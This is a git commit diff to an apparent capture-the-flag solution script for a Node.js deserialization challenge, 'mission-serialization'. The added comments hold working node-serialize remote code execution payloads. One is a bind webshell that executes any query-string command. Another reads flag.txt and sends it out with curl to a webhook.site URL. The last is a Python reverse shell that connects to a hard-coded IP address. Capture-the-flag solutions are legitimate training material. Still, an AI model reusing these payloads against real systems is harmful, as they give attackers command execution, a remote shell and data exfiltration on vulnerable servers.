26198132ee265d0c619465e9633bc54d348ce5a7
s3nn <simon@runesec.com>
2023-06-28 01:10:40 +0300

    web(mission-serialization): fix description

--- web/mission-serializaition/sol/serialize_payload.js
+++ web/mission-serializaition/sol/serialize_payload.js
@@ -4,8 +4,12 @@ var payload = {
     }
 console.log(serialize.serialize(payload));
 
+// bind webshell (won't work on deployment)
 // http://127.0.0.1:8000/gift?message={%22webShell%22:%22_$$ND_FUNC$$_function(){const%20http%20=%20require(%27http%27);%20const%20url%20=%20require(%27url%27);%20const%20ps%20%20=%20require(%27child_process%27);%20http.createServer(function%20(req,%20res)%20{%20var%20queryObject%20=%20url.parse(req.url,true).query;%20var%20cmd%20=%20queryObject[%27cmd%27];%20try%20{%20ps.exec(cmd,%20function(error,%20stdout,%20stderr)%20{%20res.end(stdout);%20});%20}%20catch%20(error)%20{%20return;%20}}).listen(8080);%20}()%22}
 
 
-
+//exfil flag
 //{"curlFlag":"_$$ND_FUNC$$_function() {require('child_process').exec('curl https://webhook.site/35f62f5e-8f87-4724-bde9-dc58097f6ba9?flag=`cat flag.txt`', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
+
+// rev shell
+//{"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('python3 -c \\'import os,pty,socket;s=socket.socket();s.connect((\"93.115.18.119\",3333));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")\\'', (error, stdout, stderr) => { console.log(stdout); }); }()"}
